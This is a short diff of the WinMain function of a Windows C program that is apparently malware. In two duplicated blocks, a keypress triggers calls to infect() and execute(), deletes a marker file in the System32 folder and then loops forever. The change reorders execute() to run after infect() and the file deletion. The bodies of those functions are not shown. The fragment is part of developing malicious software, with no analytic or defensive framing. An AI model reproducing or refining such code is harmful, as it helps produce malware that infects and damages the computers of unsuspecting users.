@@ -78,9 +78,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 					if (GetAsyncKeyState('S') & 0x8000) {
 						TerminateThread(thread, 0);
 						CloseHandle(thread);
-						execute();
 						infect();
 						DeleteFileA("C:\\Windows\\System32\\noescapeexe.txt");
+						execute();
 						for (;;) {
 							Sleep(10);
 						}
@@ -89,9 +89,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 						if (GetAsyncKeyState('S') & 0x8000) {
 							TerminateThread(thread, 0);
 							CloseHandle(thread);
-							execute();
 							infect();
 							DeleteFileA("C:\\Windows\\System32\\noescapeexe.txt");
+							execute();
 							for (;;) {
 								Sleep(10);
 							}
